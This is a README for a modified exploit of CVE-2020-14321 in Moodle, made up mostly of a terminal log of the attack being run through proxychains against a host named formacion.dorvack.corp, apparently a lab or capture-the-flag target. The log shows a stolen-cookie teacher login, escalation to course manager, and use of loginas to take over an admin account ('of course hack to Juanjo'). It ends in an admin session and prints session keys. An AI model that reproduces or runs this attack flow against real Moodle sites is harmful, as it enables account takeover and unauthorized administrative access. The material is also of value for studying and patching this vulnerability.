# CVE-2020-14321-modified-exploit
original: `https://github.com/HoangKien1020/CVE-2020-14321`
Modified Moodle exploit for privilege escalation (Dorvack)
![login with cookie](login_with_cookie.png)

```
┌──(kali㉿kali)-[~/…/192.168.1.121/exploits/CVE-2020-14321/modified]
└─$ proxychains python cve202014321.py -url https://formacion.dorvack.corp -cookie jgs48ml47fra5v3r45vdhkokb9
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.14
[+] Your target: https://formacion.dorvack.corp
jgs48ml47fra5v3r45vdhkokb9
[+] Logging in to teacher
[proxychains] Strict chain  ...  127.0.0.1:8888  ...  formacion.dorvack.corp:443  ...  OK
[+] Teacher logins successfully!
('profile_url ', 'https://formacion.dorvack.corp/user/profile.php')
('user_id ', u'0')
force_id == 7
('user_id ', 7)
('course_id ', u'2')
('sessKey ', u'N1RVMFIKlu')
[+] Privilege Escalation To Manager in the course Done!
{"success":true,"response":{},"error":"","count":1}
{"success":true,"response":{},"error":"","count":1}
{"success":true,"response":{},"error":"","count":1}
{"success":true,"response":{},"error":"","count":1}
{"success":true,"response":{},"error":"","count":1}
{"success":true,"response":{},"error":"","count":1}
{"success":true,"response":{},"error":"","count":1}
{"success":true,"response":{},"error":"","count":1}
{"error":"Invalid user","errorcode":"invaliduser","stacktrace":null,"debuginfo":null,"reproductionlink":null}
{"error":"Invalid user","errorcode":"invaliduser","stacktrace":null,"debuginfo":null,"reproductionlink":null}
{"error":"Invalid user","errorcode":"invaliduser","stacktrace":null,"debuginfo":null,"reproductionlink":null}
{"error":"Invalid user","errorcode":"invaliduser","stacktrace":null,"debuginfo":null,"reproductionlink":null}
{"error":"Invalid user","errorcode":"invaliduser","stacktrace":null,"debuginfo":null,"reproductionlink":null}
{"error":"Invalid user","errorcode":"invaliduser","stacktrace":null,"debuginfo":null,"reproductionlink":null}
{"error":"Invalid user","errorcode":"invaliduser","stacktrace":null,"debuginfo":null,"reproductionlink":null}
{"error":"Invalid user","errorcode":"invaliduser","stacktrace":null,"debuginfo":null,"reproductionlink":null}
{"error":"Invalid user","errorcode":"invaliduser","stacktrace":null,"debuginfo":null,"reproductionlink":null}
{"error":"Invalid user","errorcode":"invaliduser","stacktrace":null,"debuginfo":null,"reproductionlink":null}
{"error":"Invalid user","errorcode":"invaliduser","stacktrace":null,"debuginfo":null,"reproductionlink":null}
{"error":"Invalid user","errorcode":"invaliduser","stacktrace":null,"debuginfo":null,"reproductionlink":null}
{"error":"Invalid user","errorcode":"invaliduser","stacktrace":null,"debuginfo":null,"reproductionlink":null}
{"error":"Invalid user","errorcode":"invaliduser","stacktrace":null,"debuginfo":null,"reproductionlink":null}
{"error":"Invalid user","errorcode":"invaliduser","stacktrace":null,"debuginfo":null,"reproductionlink":null}
{"error":"Invalid user","errorcode":"invaliduser","stacktrace":null,"debuginfo":null,"reproductionlink":null}
{"error":"Invalid user","errorcode":"invaliduser","stacktrace":null,"debuginfo":null,"reproductionlink":null}
{"error":"Invalid user","errorcode":"invaliduser","stacktrace":null,"debuginfo":null,"reproductionlink":null}
{"error":"Invalid user","errorcode":"invaliduser","stacktrace":null,"debuginfo":null,"reproductionlink":null}
{"error":"Invalid user","errorcode":"invaliduser","stacktrace":null,"debuginfo":null,"reproductionlink":null}
{"error":"Invalid user","errorcode":"invaliduser","stacktrace":null,"debuginfo":null,"reproductionlink":null}
{"error":"Invalid user","errorcode":"invaliduser","stacktrace":null,"debuginfo":null,"reproductionlink":null}
{"error":"Invalid user","errorcode":"invaliduser","stacktrace":null,"debuginfo":null,"reproductionlink":null}
{"error":"Invalid user","errorcode":"invaliduser","stacktrace":null,"debuginfo":null,"reproductionlink":null}
{"error":"Invalid user","errorcode":"invaliduser","stacktrace":null,"debuginfo":null,"reproductionlink":null}
{"error":"Invalid user","errorcode":"invaliduser","stacktrace":null,"debuginfo":null,"reproductionlink":null}
{"error":"Invalid user","errorcode":"invaliduser","stacktrace":null,"debuginfo":null,"reproductionlink":null}
{"error":"Invalid user","errorcode":"invaliduser","stacktrace":null,"debuginfo":null,"reproductionlink":null}
{"error":"Invalid user","errorcode":"invaliduser","stacktrace":null,"debuginfo":null,"reproductionlink":null}
{"error":"Invalid user","errorcode":"invaliduser","stacktrace":null,"debuginfo":null,"reproductionlink":null}
{"error":"Invalid user","errorcode":"invaliduser","stacktrace":null,"debuginfo":null,"reproductionlink":null}
{"error":"Invalid user","errorcode":"invaliduser","stacktrace":null,"debuginfo":null,"reproductionlink":null}
{"error":"Invalid user","errorcode":"invaliduser","stacktrace":null,"debuginfo":null,"reproductionlink":null}
{"error":"Invalid user","errorcode":"invaliduser","stacktrace":null,"debuginfo":null,"reproductionlink":null}
{"error":"Invalid user","errorcode":"invaliduser","stacktrace":null,"debuginfo":null,"reproductionlink":null}
{"error":"Invalid user","errorcode":"invaliduser","stacktrace":null,"debuginfo":null,"reproductionlink":null}
{"error":"Invalid user","errorcode":"invaliduser","stacktrace":null,"debuginfo":null,"reproductionlink":null}
{"error":"Invalid user","errorcode":"invaliduser","stacktrace":null,"debuginfo":null,"reproductionlink":null}
{"error":"Invalid user","errorcode":"invaliduser","stacktrace":null,"debuginfo":null,"reproductionlink":null}
{"error":"Invalid user","errorcode":"invaliduser","stacktrace":null,"debuginfo":null,"reproductionlink":null}
{"error":"Invalid user","errorcode":"invaliduser","stacktrace":null,"debuginfo":null,"reproductionlink":null}
{"error":"Invalid user","errorcode":"invaliduser","stacktrace":null,"debuginfo":null,"reproductionlink":null}
{"error":"Invalid user","errorcode":"invaliduser","stacktrace":null,"debuginfo":null,"reproductionlink":null}
{"error":"Invalid user","errorcode":"invaliduser","stacktrace":null,"debuginfo":null,"reproductionlink":null}
{"error":"Invalid user","errorcode":"invaliduser","stacktrace":null,"debuginfo":null,"reproductionlink":null}
{"error":"Invalid user","errorcode":"invaliduser","stacktrace":null,"debuginfo":null,"reproductionlink":null}
{"error":"Invalid user","errorcode":"invaliduser","stacktrace":null,"debuginfo":null,"reproductionlink":null}
{"error":"Invalid user","errorcode":"invaliduser","stacktrace":null,"debuginfo":null,"reproductionlink":null}
{"error":"Invalid user","errorcode":"invaliduser","stacktrace":null,"debuginfo":null,"reproductionlink":null}
{"error":"Invalid user","errorcode":"invaliduser","stacktrace":null,"debuginfo":null,"reproductionlink":null}
{"error":"Invalid user","errorcode":"invaliduser","stacktrace":null,"debuginfo":null,"reproductionlink":null}
{"error":"Invalid user","errorcode":"invaliduser","stacktrace":null,"debuginfo":null,"reproductionlink":null}
{"error":"Invalid user","errorcode":"invaliduser","stacktrace":null,"debuginfo":null,"reproductionlink":null}
{"error":"Invalid user","errorcode":"invaliduser","stacktrace":null,"debuginfo":null,"reproductionlink":null}
{"error":"Invalid user","errorcode":"invaliduser","stacktrace":null,"debuginfo":null,"reproductionlink":null}
{"error":"Invalid user","errorcode":"invaliduser","stacktrace":null,"debuginfo":null,"reproductionlink":null}
{"error":"Invalid user","errorcode":"invaliduser","stacktrace":null,"debuginfo":null,"reproductionlink":null}
{"error":"Invalid user","errorcode":"invaliduser","stacktrace":null,"debuginfo":null,"reproductionlink":null}
{"error":"Invalid user","errorcode":"invaliduser","stacktrace":null,"debuginfo":null,"reproductionlink":null}
{"error":"Invalid user","errorcode":"invaliduser","stacktrace":null,"debuginfo":null,"reproductionlink":null}
{"error":"Invalid user","errorcode":"invaliduser","stacktrace":null,"debuginfo":null,"reproductionlink":null}
{"error":"Invalid user","errorcode":"invaliduser","stacktrace":null,"debuginfo":null,"reproductionlink":null}
{"error":"Invalid user","errorcode":"invaliduser","stacktrace":null,"debuginfo":null,"reproductionlink":null}
{"error":"Invalid user","errorcode":"invaliduser","stacktrace":null,"debuginfo":null,"reproductionlink":null}
{"error":"Invalid user","errorcode":"invaliduser","stacktrace":null,"debuginfo":null,"reproductionlink":null}
{"error":"Invalid user","errorcode":"invaliduser","stacktrace":null,"debuginfo":null,"reproductionlink":null}
{"error":"Invalid user","errorcode":"invaliduser","stacktrace":null,"debuginfo":null,"reproductionlink":null}
{"error":"Invalid user","errorcode":"invaliduser","stacktrace":null,"debuginfo":null,"reproductionlink":null}
{"error":"Invalid user","errorcode":"invaliduser","stacktrace":null,"debuginfo":null,"reproductionlink":null}
{"error":"Invalid user","errorcode":"invaliduser","stacktrace":null,"debuginfo":null,"reproductionlink":null}
{"error":"Invalid user","errorcode":"invaliduser","stacktrace":null,"debuginfo":null,"reproductionlink":null}
{"error":"Invalid user","errorcode":"invaliduser","stacktrace":null,"debuginfo":null,"reproductionlink":null}
{"error":"Invalid user","errorcode":"invaliduser","stacktrace":null,"debuginfo":null,"reproductionlink":null}
{"error":"Invalid user","errorcode":"invaliduser","stacktrace":null,"debuginfo":null,"reproductionlink":null}
{"error":"Invalid user","errorcode":"invaliduser","stacktrace":null,"debuginfo":null,"reproductionlink":null}
{"error":"Invalid user","errorcode":"invaliduser","stacktrace":null,"debuginfo":null,"reproductionlink":null}
{"error":"Invalid user","errorcode":"invaliduser","stacktrace":null,"debuginfo":null,"reproductionlink":null}
{"error":"Invalid user","errorcode":"invaliduser","stacktrace":null,"debuginfo":null,"reproductionlink":null}
{"error":"Invalid user","errorcode":"invaliduser","stacktrace":null,"debuginfo":null,"reproductionlink":null}
{"error":"Invalid user","errorcode":"invaliduser","stacktrace":null,"debuginfo":null,"reproductionlink":null}
{"error":"Invalid user","errorcode":"invaliduser","stacktrace":null,"debuginfo":null,"reproductionlink":null}
{"error":"Invalid user","errorcode":"invaliduser","stacktrace":null,"debuginfo":null,"reproductionlink":null}
{"error":"Invalid user","errorcode":"invaliduser","stacktrace":null,"debuginfo":null,"reproductionlink":null}
{"error":"Invalid user","errorcode":"invaliduser","stacktrace":null,"debuginfo":null,"reproductionlink":null}
{"error":"Invalid user","errorcode":"invaliduser","stacktrace":null,"debuginfo":null,"reproductionlink":null}
{"error":"Invalid user","errorcode":"invaliduser","stacktrace":null,"debuginfo":null,"reproductionlink":null}
{"error":"Invalid user","errorcode":"invaliduser","stacktrace":null,"debuginfo":null,"reproductionlink":null}
{"error":"Invalid user","errorcode":"invaliduser","stacktrace":null,"debuginfo":null,"reproductionlink":null}
{"error":"Invalid user","errorcode":"invaliduser","stacktrace":null,"debuginfo":null,"reproductionlink":null}
('course ', u'https://formacion.dorvack.corp/user/index.php?id=2')
[proxychains] Strict chain  ...  127.0.0.1:8888  ...  formacion.dorvack.corp:443  ...  OK
('context_id: ', u'0')
('get_user ', 'https://formacion.dorvack.corp/user/index.php?contextid=32&roleid=1')
('Manager_id ', [u'7', u'8'])
manager_id == 7 Admin 
manager_id == 8 Juanjo ---> of course hack to Juanjo 
('url_loginas ', u'https://formacion.dorvack.corp/course/loginas.php?id=2&user=8&sesskey=N1RVMFIKlu')
('new_session ', u'fioOrTuumN')
('go_to----> ', 'https://formacion.dorvack.corp/admin/search.php')


```

After refresh your browser:
![admin session](new_admin_session.png)
